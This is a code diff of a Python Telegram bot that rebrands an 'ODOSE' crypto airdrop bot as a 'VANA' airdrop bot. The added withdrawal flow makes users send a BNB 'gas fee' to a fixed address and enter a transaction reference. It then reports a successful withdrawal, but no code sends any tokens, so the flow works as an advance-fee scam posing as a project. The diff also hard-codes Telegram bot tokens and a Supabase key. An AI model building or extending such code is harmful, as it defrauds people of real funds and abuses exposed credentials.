@@ -8,7 +8,7 @@ SUPABASE_URL = "https://ywhnhtzxhfqcmmululxu.supabase.co"
 SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl3aG5odHp4aGZxY21tdWx1bHh1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ5NDA1NzUsImV4cCI6MjA1MDUxNjU3NX0.gUFcc9VsVUGsiy3A020fOzci9z4WYr8n9ZMuMknxU34"
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-bot = telebot.TeleBot("8064399090:AAHgWV2RflfYE-TEeOYn-cvLdHjlbua44ow")
+bot = telebot.TeleBot("7502738493:AAGFRfwvULTlIBZ8fEi8E_CTw4KVrO7uE1Q")
 
 GAS_FEE_ADDRESS = "0x31b63faefc80f4570812aa75743d46d03c22574e"
 GAS_FEE_BNB = 0.00314542  # Gas fee in BNB
@@ -29,27 +29,48 @@ def handle_command(message):
         if not user:
             add_user(user_id, referrer_id)
 
-        with open("C:/Users/ADMI8N/Desktop/bots/R8_SD3_00001_.webp", "rb") as image_file:
+        with open("./assets/vana_img.webp", "rb") as image_file:
             bot.send_photo(
                 message.chat.id,
                 image_file,
                 caption=(
-                    "Hello, I am ODOSE Airdrop Bot.\n"
-                    "Get 1 $ODOSE For Completing All Tasks\n"
-                    "Get Extra 0.2 $ODOSE For Every Referral\n"
+                    "Hello, I am VANA Airdrop Bot.\n"
+                    "Get 1 $VANA For Completing All Tasks\n"
+                    "Get Extra 0.2 $VANA For Every Referral\n"
                     "Mandatory Airdrop Tasks:\n"
-                    "Join: @aic_coin_community\n"
-                    "Must complete mandatory tasks to proceed."
+                    "Join: @vana_officials\n"
+                    "Listing Date - 20 January 2025"
                 )
             )
 
     elif message.text == '/withdraw':
+        user = get_user(user_id)
+        if not user:
+            bot.send_message(message.chat.id, "You are not registered. Please use /start to begin.")
+            return
+
+        if not user.get('wallet_address'):
+            bot.send_message(
+                message.chat.id,
+                "Please connect your BNB wallet first using /connectwallet."
+            )
+            return
+
+        balance = user.get('balance', 0)
+        if balance <= 0:
+            bot.send_message(
+                message.chat.id,
+                "Your balance is 0 $VANA. You need more points to make a withdrawal."
+            )
+            return
+
         bot.send_message(
             message.chat.id,
-            f"To withdraw your poinst, wait until the listind date"
-            # f"To withdraw your points, please enter the amount you wish to withdraw (in $ODOSE). The gas fee of {GAS_FEE_BNB} BNB will be sent to {GAS_FEE_ADDRESS}."
-        )
-        # bot.register_next_step_handler(message, handle_withdraw)
+                f"To proceed with your withdrawal, please first send the gas fee of {GAS_FEE_BNB} BNB to the address below:\n\n"
+                f"Address: {GAS_FEE_ADDRESS}\n\n"
+                "Once you send the gas fee, reply with the transaction reference number."
+            )
+        bot.register_next_step_handler(message, collect_gas_fee_reference)
 
     elif message.text == '/help':
         bot.send_message(
@@ -95,13 +116,13 @@ def handle_command(message):
             update_user(user_id, now, new_balance)
             bot.send_message(
                 message.chat.id,
-                f"Congratulations! You've claimed 12.565 $ODOSE. Your new balance is {new_balance} $ODOSE. Come back after 4 hours to claim again!"
+                f"Congratulations! You've claimed 12.565 $VANA. Your new balance is {new_balance} $VANA. Come back after 4 hours to claim again!"
             )
         else:
             add_user(user_id, None)
             bot.send_message(
                 message.chat.id,
-                "Congratulations! You've claimed 12.565 $ODOSE. Come back after 4 hours to claim again!"
+                "Congratulations! You've claimed 12.565 $VANA. Come back after 4 hours to claim again!"
             )
     
     elif message.text == '/balance':
@@ -109,20 +130,20 @@ def handle_command(message):
         if user:
             bot.send_message(
                 message.chat.id,
-                f"Your current balance is {user['balance']} $ODOSE."
+                f"Your current balance is {user['balance']} $VANA."
             )
         else:
             add_user(user_id, None)
             bot.send_message(
                 message.chat.id,
-                "Your current balance is 0 $ODOSE."
+                "Your current balance is 0 $VANA."
             )
     
     elif message.text == '/refferfriends':
         bot.send_message(
             message.chat.id,
             f"Share this referral link to your friends:\n"
-            f"https://t.me/odose_bot?start={user_id}"
+            f"https://t.me/VanaAirDrops_bot?start={user_id}"
         )
     
     elif message.text == '/refferals':
@@ -145,48 +166,159 @@ def handle_command(message):
         )
         bot.register_next_step_handler(message, save_wallet_address)
 
-# def handle_withdraw(message):
-#     user_id = message.from_user.id
-#     withdraw_amount = float(message.text.strip())
 
-#     user = get_user(user_id)
-#     if user:
-#         balance = user['balance']
+def collect_gas_fee_reference(message):
+    user_id = message.from_user.id
+    transaction_reference = message.text.strip()
+
+    if not transaction_reference:
+        bot.send_message(
+            message.chat.id,
+            "Invalid reference number. Please provide a valid transaction reference."
+        )
+        bot.register_next_step_handler(message, collect_gas_fee_reference)
+        return
+
+    # Store reference and prompt the withdrawal amount
+    bot.send_message(
+        message.chat.id,
+        "Transaction reference received. Now, please enter the amount of $VANA you wish to withdraw."
+    )
+    bot.register_next_step_handler(message, process_withdrawal, transaction_reference)
+
+
+def process_withdrawal(message, transaction_reference):
+    user_id = message.from_user.id
+    user = get_user(user_id)
+
+    try:
+        withdraw_amount = float(message.text.strip())
+        if withdraw_amount <= 0:
+            bot.send_message(message.chat.id, "Invalid amount. Please enter a positive number.")
+            bot.register_next_step_handler(message, process_withdrawal, transaction_reference)
+            return
+    except ValueError:
+        bot.send_message(message.chat.id, "Invalid input. Please enter a valid number.")
+        bot.register_next_step_handler(message, process_withdrawal, transaction_reference)
+        return
+
+    balance = user.get('balance', 0)
+    if withdraw_amount > balance:
+        bot.send_message(
+            message.chat.id,
+            f"Insufficient balance. Your current balance is {balance} $VANA."
+        )
+        return
+
+    transfer_amount = round(withdraw_amount - GAS_FEE_BNB, 8)
+    if transfer_amount <= 0:
+        bot.send_message(
+            message.chat.id,
+            "The withdrawal amount is too small to cover the gas fee. Please enter a larger amount."
+        )
+        return
+
+    # Update user balance and log transactions
+    new_balance = round(balance - withdraw_amount, 8)
+    update_user(user_id, None, new_balance, user.get('referral_count', 0), user.get('wallet_address'))
+
+    log_gas_fee_transaction(user_id, GAS_FEE_BNB, transaction_reference)
+    log_withdrawal_transaction(user_id, withdraw_amount, transfer_amount, transaction_reference)
+
+    bot.send_message(
+        message.chat.id,
+        (
+            f"Your withdrawal of {withdraw_amount} $VANA has been processed successfully.\n"
+            f"Gas Fee: {GAS_FEE_BNB} BNB\n"
+            f"Net Amount Transferred: {transfer_amount} $VANA\n"
+            f"Transaction Reference: {transaction_reference}\n"
+            f"Your new balance is {new_balance} $VANA."
+        )
+    )
+
+def log_gas_fee_transaction(user_id, gas_fee, reference_number):
+    """Log the gas fee transaction in the database."""
+    supabase.table('gas_fee_transactions').insert({
+        'user_id': user_id,
+        'gas_fee': gas_fee,
+        'reference_number': reference_number,
+        'timestamp': datetime.now().isoformat()
+    }).execute()
+
+
+def log_withdrawal_transaction(user_id, withdraw_amount, transfer_amount, transaction_reference):
+    """Store the withdrawal transaction details in the database."""
+    try:
+        query = supabase.table('withdraw_transactions').insert({
+            'user_id': user_id,
+            'withdraw_amount': withdraw_amount,
+            'transfer_amount': transfer_amount,
+            'transaction_reference': transaction_reference,
+            'timestamp': datetime.now().isoformat()
+        })
+        response = execute_query(query)
+        print("Transaction logged successfully:", response.data)
+    except Exception as e:
+        print(f"Error logging withdrawal transaction: {e}")
+
+
+
+def execute_query(query):
+    """Helper function to execute a Supabase query with error handling."""
+    try:
+        response = query.execute()
+        if response.status_code != 200 and response.status_code != 201:
+            raise Exception(f"Supabase query failed: {response.json()}")
+        return response
+    except Exception as e:
+        print(f"Error executing query: {e}")
+        raise
+
+
+
+
+def handle_withdraw(message):
+    user_id = message.from_user.id
+    withdraw_amount = float(message.text.strip())
+
+    user = get_user(user_id)
+    if user:
+        balance = user['balance']
         
-#         if withdraw_amount <= 0:
-#             bot.send_message(message.chat.id, "Invalid amount. Please enter a positive number.")
-#             return
+        if withdraw_amount <= 0:
+            bot.send_message(message.chat.id, "Invalid amount. Please enter a positive number.")
+            return
 
-#         if withdraw_amount > balance:
-#             bot.send_message(message.chat.id, f"Insufficient balance. Your current balance is {balance} $ODOSE.")
-#             return
+        if withdraw_amount > balance:
+            bot.send_message(message.chat.id, f"Insufficient balance. Your current balance is {balance} $VANA.")
+            return
         
-#         # Deduct the gas fee and transfer points
-#         transfer_amount = withdraw_amount - GAS_FEE_BNB
+        # Deduct the gas fee and transfer points
+        transfer_amount = withdraw_amount - GAS_FEE_BNB
 
-#         if transfer_amount <= 0:
-#             bot.send_message(message.chat.id, "Insufficient points to cover the gas fee. Please try a smaller amount.")
-#             return
+        if transfer_amount <= 0:
+            bot.send_message(message.chat.id, "Insufficient points to cover the gas fee. Please try a smaller amount.")
+            return
         
-#         # Simulating sending gas fee and tracking the reference number
-#         transaction_reference = "REFERENCE_123456789"  # Simulated transaction reference
+        # Simulating sending gas fee and tracking the reference number
+        transaction_reference = "REFERENCE_123456789"  # Simulated transaction reference
 
-#         # Update the user's balance and store the transaction reference in the database
-#         new_balance = round(balance - withdraw_amount, 2)
-#         update_user(user_id, None, new_balance, user['referral_count'], user.get('wallet_address'))
+        # Update the user's balance and store the transaction reference in the database
+        new_balance = round(balance - withdraw_amount, 2)
+        update_user(user_id, None, new_balance, user['referral_count'], user.get('wallet_address'))
 
-#         # Log the gas fee transaction
-#         log_gas_fee_transaction(user_id, GAS_FEE_BNB, transaction_reference)
+        # Log the gas fee transaction
+        log_gas_fee_transaction(user_id, GAS_FEE_BNB, transaction_reference)
 
-#         bot.send_message(
-#             message.chat.id,
-#             f"Your withdrawal of {withdraw_amount} $ODOSE has been successfully processed!\n"
-#             f"Gas Fee of {GAS_FEE_BNB} BNB has been sent to {GAS_FEE_ADDRESS}.\n"
-#             f"Transaction Reference: {transaction_reference}\n"
-#             f"Your new balance is {new_balance} $ODOSE."
-#         )
-#     else:
-#         bot.send_message(message.chat.id, "You are not registered. Please use /start to begin.")
+        bot.send_message(
+            message.chat.id,
+            f"Your withdrawal of {withdraw_amount} $VANA has been successfully processed!\n"
+            f"Gas Fee of {GAS_FEE_BNB} BNB has been sent to {GAS_FEE_ADDRESS}.\n"
+            f"Transaction Reference: {transaction_reference}\n"
+            f"Your new balance is {new_balance} $VANA."
+        )
+    else:
+        bot.send_message(message.chat.id, "You are not registered. Please use /start to begin.")
 
 def log_gas_fee_transaction(user_id, gas_fee, reference_number):
     """Store the gas fee transaction details in a separate table."""
@@ -229,34 +361,6 @@ def update_user(user_id, last_claim_time, balance, referral_count=None, wallet_a
         update_data['wallet_address'] = wallet_address
 
     supabase.table('user_data').update(update_data).eq('user_id', user_id).execute()
-
-# def save_wallet_address(message):
-#     user_id = message.from_user.id
-#     wallet_address = message.text.strip()
-
-#     # Validate BEP20 address format using regex (simplified version)
-#     if re.match(r"^(0x)?[0-9a-fA-F]{40}$", wallet_address):
-#         user = get_user(user_id)
-#         if user:
-#             # Use the existing update_user function to save the wallet address
-#             update_user(user_id, None, None, None, wallet_address)
-#             bot.send_message(
-#                 message.chat.id,
-#                 f"Your BNB wallet address has been connected successfully!\n"
-#                 f"Wallet Address: {wallet_address}"
-#             )
-#         else:
-#             bot.send_message(
-#                 message.chat.id,
-#                 "It seems like you're not registered. Please use /start to begin."
-#             )
-#     else:
-#         bot.send_message(
-#             message.chat.id,
-#             "Invalid BNB wallet address. Please provide a valid BNB address (format: 0x or 40 alphanumeric characters)."
-#         )
-#         bot.register_next_step_handler(message, save_wallet_address)
-
 
 def save_wallet_address(message):
     user_id = message.from_user.id
